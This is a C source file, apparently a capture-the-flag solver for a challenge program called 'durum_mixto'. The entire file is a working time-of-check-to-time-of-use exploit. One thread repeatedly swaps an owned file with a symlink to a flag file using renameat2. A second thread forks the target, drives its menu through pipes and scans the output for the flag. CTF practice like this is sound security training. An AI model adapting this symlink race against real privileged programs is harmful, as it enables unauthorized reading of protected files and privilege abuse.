#define _GNU_SOURCE
#include <stddef.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/wait.h>
#include <pthread.h>

const char lnk[] = "/home/user/link";
const char flag[] = "/home/user/flag.txt";
const char ownedfile[] = "/home/user/ownedfile";
const char aaaa[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n";
int solved = 0, debug = 0, writeFd;
FILE * readF;

void *race4win(){
	while(!solved){
		renameat2(0, ownedfile, 0, lnk, RENAME_EXCHANGE);
	}
	pthread_exit(NULL);
}

void readlines(int n){
	char tmp[1024];
	for (int i = 0; i < n; ++i)
	{
		fgets(tmp, 1024, readF);
		if(debug&2)
			printf("%s",tmp);
	}
}

void writeline(char *buff){
	write(writeFd, buff, strlen(buff));
	if(debug&2)
		printf("%s", buff);
}

void *call2durum_mixto(){
	int pipeout[2], pipein[2];
	char buff[1024];
	while(!solved){
		memset(buff, 0, 1024);
		pipe(pipeout);	// pipe for monitoring output to check if we got the flag
		pipe(pipein);	// pipe to comunicate with the menu
		if(!fork()){	// child calls durum_mixto
			close(pipeout[0]);
			close(STDOUT_FILENO);
			dup(pipeout[1]);
			close(pipeout[1]);
			close(pipein[1]);
			close(STDIN_FILENO);
			dup(pipein[0]);
			close(pipein[0]);
			close(STDERR_FILENO); // ignore errors
			execlp("./durum_mixto", "durum_mixto", NULL);
		}else{			// parent checks output
			close(pipeout[1]);
			close(pipein[0]);
			readF = fdopen(pipeout[0], "r");
			writeFd = pipein[1];
			readlines(6);
			writeline("1\n");
			readlines(1);
			writeline((char *) lnk);
			writeline("\n");
			fgets(buff, 1024, readF);
			if(strncmp(buff, "Error", 5)){ // only enter if we won the race, else continue triying
				if(debug)
					puts("We could have won the race, let's check!!");
				if(debug&2)
					printf("%s", buff);
				readlines(5);
				writeline("4\n");
				readlines(6);
				writeline("2\n");
				writeline((char *) aaaa);
				readlines(6);
				writeline("3\n");
				readlines(6);
				writeline("5\n");
				fgets(buff, 1024, readF);
				if(debug)
					printf("POSSIBLE FLAG --> %s", buff);
				if(!strncmp(buff+2,"ckOn{",5)){
					printf("FLAAAAAG -> Ha%s", buff+2);
					solved = 1;
				}
				readlines(6);
				writeline("s\n");
			}else{
				if(debug)
					printf("%s", buff);
			}
			close(pipeout[0]);
			close(pipein[1]);
			fclose(readF);
			wait(NULL);
		}
	}
	remove(ownedfile); 
	remove(lnk);
	pthread_exit(NULL);
}

int main(int argc, char const *argv[])
{
	if(argc==2){
		if(!strcmp(argv[1],"-v"))
			debug = 1;
		if(!strcmp(argv[1],"-vv"))
			debug = 2;
	}
	pthread_t th1, th2;
	symlink(flag, lnk);				// soft link to flag
	close(creat(ownedfile, 0666)); 	// simple file owned by us

	// 2 threads for the race
	pthread_create(&th1, NULL, race4win, NULL);		// this one exchanges the names of both files
	pthread_create(&th2, NULL, call2durum_mixto, NULL);	// this one calls ./durum_mixto and checks the output to get the flag out of memory
	pthread_join(th1, NULL);
	pthread_join(th2, NULL);

	return 0;
}
// gcc solver_durum_mixto.c -o solver_durum_mixto -lpthread
